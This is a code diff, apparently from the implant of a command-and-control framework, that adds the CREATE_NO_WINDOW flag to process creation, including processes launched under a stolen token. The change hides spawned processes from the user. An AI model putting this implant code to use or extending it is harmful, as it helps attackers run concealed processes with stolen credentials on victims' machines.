@@ -374,7 +374,18 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
 
         if ( Instance->Tokens.Token->Type == TOKEN_TYPE_STOLEN )
         {
-            if ( ! Instance->Win32.CreateProcessWithTokenW( Instance->Tokens.Token->Handle, LOGON_NETCREDENTIALS_ONLY, App, CommandLineW, Flags, NULL, NULL, &StartUpInfo, ProcessInfo ) )
+            if ( ! Instance->Win32.CreateProcessWithTokenW(
+                    Instance->Tokens.Token->Handle,
+                    LOGON_NETCREDENTIALS_ONLY,
+                    App,
+                    CommandLineW,
+                    Flags | CREATE_NO_WINDOW,
+                    NULL,
+                    NULL,
+                    &StartUpInfo,
+                    ProcessInfo
+                    )
+                )
             {
                 PRINTF( "CreateProcessWithTokenW: Failed [%d]\n", NtGetLastError() );
                 PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
@@ -391,7 +402,7 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
                         LOGON_NETCREDENTIALS_ONLY,
                         App,
                         CommandLineW,
-                        Flags,
+                        Flags | CREATE_NO_WINDOW,
                         NULL,
                         NULL,
                         &StartUpInfo,
@@ -411,7 +422,19 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
     }
     else
     {
-        if ( ! Instance->Win32.CreateProcessA( App, CmdLine, NULL, NULL, TRUE, Flags, NULL, NULL, &StartUpInfo, ProcessInfo ) )
+        if ( ! Instance->Win32.CreateProcessA(
+                App,
+                CmdLine,
+                NULL,
+                NULL,
+                TRUE,
+                Flags | CREATE_NO_WINDOW,
+                NULL,
+                NULL,
+                &StartUpInfo,
+                ProcessInfo
+                )
+            )
         {
             PRINTF( "CreateProcessA: Failed [%d]\n", NtGetLastError() );
             PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
